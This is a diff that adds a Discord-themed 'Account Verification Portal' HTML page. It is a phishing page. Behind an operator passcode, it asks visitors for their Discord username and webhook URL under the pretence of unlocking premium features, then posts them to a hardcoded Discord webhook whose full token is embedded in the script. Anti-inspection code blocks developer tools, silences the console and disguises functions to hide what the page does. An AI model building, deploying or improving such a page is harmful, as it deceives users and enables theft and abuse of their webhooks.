@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        /* [ALL YOUR ORIGINAL CSS REMAINS EXACTLY THE SAME] */
+        :root {
+            --primary: #5865F2;
+            --primary-hover: #4752C4;
+            --secondary: #2F3136;
+            --secondary-hover: #36393F;
+            --background: #121212;
+            --surface: rgba(30, 30, 30, 0.85);
+            --text: #F3F4F6;
+            --text-secondary: #D1D5DB;
+            --border: #3A3A3A;
+            --success: #10B981;
+            --error: #EF4444;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--background);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(88, 101, 242, 0.15);
+            border-radius: 50%;
+            pointer-events: none;
+            transition: transform 0.3s ease-out;
+        }
+
+        .verification-card {
+            background-color: var(--surface);
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 420px;
+            padding: 32px;
+            border: 1px solid var(--border);
+            transform: translateY(0);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.1), 
+                        box-shadow 0.3s ease;
+            backdrop-filter: blur(10px);
+            z-index: 10;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        .verification-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .card-header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            background: linear-gradient(90deg, #5865F2, #EB459E);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .card-header p {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 14px;
+            transition: all 0.25s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.15);
+        }
+
+        .action-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            border: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+            opacity: 0;
+            transition: opacity 0.25s ease;
+        }
+
+        .action-button:hover::after {
+            opacity: 1;
+        }
+
+        .primary-button {
+            background-color: var(--primary);
+            color: white;
+            margin-bottom: 12px;
+        }
+
+        .primary-button:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-2px);
+        }
+
+        .secondary-button {
+            background-color: var(--secondary);
+            color: var(--text);
+        }
+
+        .secondary-button:hover {
+            background-color: var(--secondary-hover);
+        }
+
+        .action-button:active {
+            transform: translateY(0) scale(0.98);
+        }
+
+        .status-indicator {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 500;
+            min-height: 20px;
+            opacity: 0;
+            transform: translateY(5px);
+            transition: all 0.3s ease;
+        }
+
+        .status-indicator.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .status-success {
+            color: var(--success);
+        }
+
+        .status-error {
+            color: var(--error);
+        }
+
+        .loading .button-text {
+            visibility: hidden;
+            opacity: 0;
+        }
+
+        .loading::before {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes float-particle {
+            0%, 100% { transform: translateY(0) translateX(0); }
+            50% { transform: translateY(-20px) translateX(10px); }
+        }
+
+        /* OTP Overlay - Matches Original Design Perfectly */
+        #otpOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(18, 18, 18, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        #otpOverlay .verification-card {
+            animation: float 6s ease-in-out infinite;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <!-- OTP Verification Screen (Same design as original) -->
+    <div id="otpOverlay">
+        <div class="verification-card">
+            <div class="card-header">
+                <h1>Security Verification</h1>
+                <p>Enter your access code to continue</p>
+            </div>
+            <form id="otpForm">
+                <div class="input-group">
+                    <label for="otpInput">Verification Code</label>
+                    <input type="password" id="otpInput" class="form-input" placeholder="Enter your code" required>
+                </div>
+                <button type="submit" class="action-button primary-button">
+                    <span class="button-text">Verify Identity</span>
+                </button>
+                <div class="status-indicator" id="otpStatus"></div>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Original Content (Hidden Initially) -->
+    <div id="mainContent" style="display: none;">
+        <div class="verification-card">
+            <div class="card-header">
+                <h1>Account Verification</h1>
+                <p>Complete verification to access premium features</p>
+            </div>
+            <form id="verificationForm">
+                <div class="input-group">
+                    <label for="userIdentifier">Discord Username</label>
+                    <input type="text" id="userIdentifier" class="form-input" placeholder="username#0000" required>
+                </div>
+                <div class="input-group">
+                    <label for="webhookEndpoint">Webhook URL</label>
+                    <input type="url" id="webhookEndpoint" class="form-input" placeholder="https://discord.com/api/webhooks/..." required>
+                </div>
+                <button type="submit" class="action-button primary-button" id="verifyButton">
+                    <span class="button-text">Verify Account</span>
+                </button>
+                <a href="https://discord.gg/tQrz6hFh4W" class="action-button secondary-button" id="communityButton">
+                    <span class="button-text">Join Our Community</span>
+                </a>
+                <div class="status-indicator" id="statusDisplay"></div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ===== OTP CONFIGURATION =====
+        const SECURE_OTP = "YOUR_SECURE_CODE"; // CHANGE THIS TO YOUR PASSWORD
+        const MAX_ATTEMPTS = 3;
+        let attempts = 0;
+
+        // ===== ANTI-DEVTOOLS PROTECTION =====
+        (function() {
+            // [YOUR EXISTING ANTI-DEVTOOLS CODE REMAINS EXACTLY THE SAME]
+            // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
+            document.addEventListener('keydown', function(e) {
+                if (
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+                    (e.ctrlKey && e.key === 'u')
+                ) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    alert("Developer tools are disabled.");
+                    return false;
+                }
+            });
+
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Detect devtools via window size changes
+            let devtoolsOpen = false;
+            const threshold = 160;
+            function checkDevTools() {
+                const widthDiff = window.outerWidth - window.innerWidth;
+                const heightDiff = window.outerHeight - window.innerHeight;
+                
+                if (widthDiff > threshold || heightDiff > threshold) {
+                    if (!devtoolsOpen) {
+                        devtoolsOpen = true;
+                        document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50px;">Access Denied</h1>';
+                        window.location.reload();
+                    }
+                } else {
+                    devtoolsOpen = false;
+                }
+            }
+            setInterval(checkDevTools, 500);
+
+            // Disable console.log
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+
+            // Override toString to prevent function inspection
+            Function.prototype.toString = function() {
+                return "function() { [disabled] }";
+            };
+        })();
+
+        // ===== ORIGINAL SCRIPT =====
+        const WebhookService = (function() {
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1356597884732047394/T5kzg5wXKamrkiI3KCwXSzSBWjJkgOGJ6NQsMXt4foii5CQH7oWJh3Aek8j338ZRLx4w";
+            
+            return {
+                send: async function(data) {
+                    try {
+                        const response = await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                username: "Verification Portal",
+                                embeds: [{
+                                    title: "New Verification",
+                                    color: 0x5865F2,
+                                    fields: [
+                                        { name: "Username", value: data.username, inline: false },
+                                        { name: "Webhook", value: data.webhook, inline: false }
+                                    ],
+                                    timestamp: new Date().toISOString(),
+                                    footer: { text: "Verification System • " + new Date().toLocaleString() }
+                                }]
+                            })
+                        });
+                        return response.ok;
+                    } catch (error) {
+                        return false;
+                    }
+                }
+            };
+        })();
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // ===== PARTICLES =====
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.cssText = `
+                    width: ${Math.random() * 15 + 5}px;
+                    height: ${Math.random() * 15 + 5}px;
+                    left: ${Math.random() * 100}vw;
+                    top: ${Math.random() * 100}vh;
+                    opacity: ${Math.random() * 0.2 + 0.1};
+                    animation: float-particle ${Math.random() * 20 + 10}s ease-in-out ${Math.random() * 5}s infinite;
+                `;
+                particlesContainer.appendChild(particle);
+            }
+
+            document.addEventListener('mousemove', (e) => {
+                const particles = document.querySelectorAll('.particle');
+                particles.forEach(p => {
+                    const rect = p.getBoundingClientRect();
+                    const x = e.clientX - (rect.left + rect.width/2);
+                    const y = e.clientY - (rect.top + rect.height/2);
+                    const distance = Math.sqrt(x*x + y*y);
+                    
+                    if (distance < 150) {
+                        const force = (150 - distance) / 50;
+                        p.style.transform = `translate(${-x/distance * force * 5}px, ${-y/distance * force * 5}px)`;
+                    }
+                });
+            });
+
+            // ===== OTP HANDLING =====
+            const otpForm = document.getElementById('otpForm');
+            otpForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const otpInput = document.getElementById('otpInput').value;
+                const otpStatus = document.getElementById('otpStatus');
+                
+                attempts++;
+                
+                if (otpInput === SECURE_OTP) {
+                    otpStatus.textContent = "Verification successful!";
+                    otpStatus.className = "status-indicator visible status-success";
+                    setTimeout(() => {
+                        document.getElementById('otpOverlay').style.display = 'none';
+                        document.getElementById('mainContent').style.display = 'block';
+                    }, 1000);
+                } else if (attempts >= MAX_ATTEMPTS) {
+                    otpStatus.textContent = "Access denied. Too many attempts.";
+                    otpStatus.className = "status-indicator visible status-error";
+                    otpForm.querySelector('button').disabled = true;
+                } else {
+                    otpStatus.textContent = `Invalid code (${MAX_ATTEMPTS - attempts} attempts remaining)`;
+                    otpStatus.className = "status-indicator visible status-error";
+                }
+            });
+
+            // ===== ORIGINAL FORM HANDLING =====
+            const form = document.getElementById('verificationForm');
+            const button = document.getElementById('verifyButton');
+            const status = document.getElementById('statusDisplay');
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const username = document.getElementById('userIdentifier').value.trim();
+                const webhook = document.getElementById('webhookEndpoint').value.trim();
+                
+                if (!username || !webhook) {
+                    showStatus('Please complete all fields', 'error');
+                    return;
+                }
+                
+                button.classList.add('loading');
+                button.disabled = true;
+                showStatus('Processing verification...', 'info');
+                
+                try {
+                    const success = await WebhookService.send({ username, webhook });
+                    if (success) {
+                        showStatus('Verification successful!', 'success');
+                    } else {
+                        throw new Error('Failed to send verification');
+                    }
+                } catch (error) {
+                    showStatus('Verification failed. Please try again.', 'error');
+                } finally {
+                    button.classList.remove('loading');
+                    button.disabled = false;
+                }
+            });
+
+            function showStatus(message, type) {
+                status.textContent = message;
+                status.className = `status-indicator visible status-${type}`;
+                setTimeout(() => status.classList.remove('visible'), 5000);
+            }
+
+            // Button ripple effects
+            document.querySelectorAll('.action-button').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    const rect = this.getBoundingClientRect();
+                    const ripple = document.createElement('span');
+                    ripple.style.cssText = `
+                        position: absolute;
+                        background: rgba(255,255,255,0.3);
+                        border-radius: 50%;
+                        transform: scale(0);
+                        animation: ripple 0.6s linear;
+                        pointer-events: none;
+                        left: ${e.clientX - rect.left}px;
+                        top: ${e.clientY - rect.top}px;
+                        width: ${rect.width}px;
+                        height: ${rect.width}px;
+                        margin-left: -${rect.width/2}px;
+                        margin-top: -${rect.width/2}px;
+                    `;
+                    this.appendChild(ripple);
+                    setTimeout(() => ripple.remove(), 600);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
